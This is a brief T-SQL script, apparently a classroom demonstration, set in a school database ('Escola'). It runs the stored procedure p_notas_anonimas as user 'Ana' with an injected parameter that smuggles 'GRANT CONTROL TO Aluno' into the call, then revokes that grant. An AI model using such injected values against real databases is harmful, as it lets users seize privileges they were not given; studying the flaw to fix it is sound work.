USE Escola

GRANT Execute ON dbo.p_notas_anonimas TO Aluno

GO

EXEC AS USER = 'Ana';

EXEC p_notas_anonimas '''; GRANT CONTROL TO Aluno--'

REVERT

GO

REVOKE CONTROL TO Aluno

GO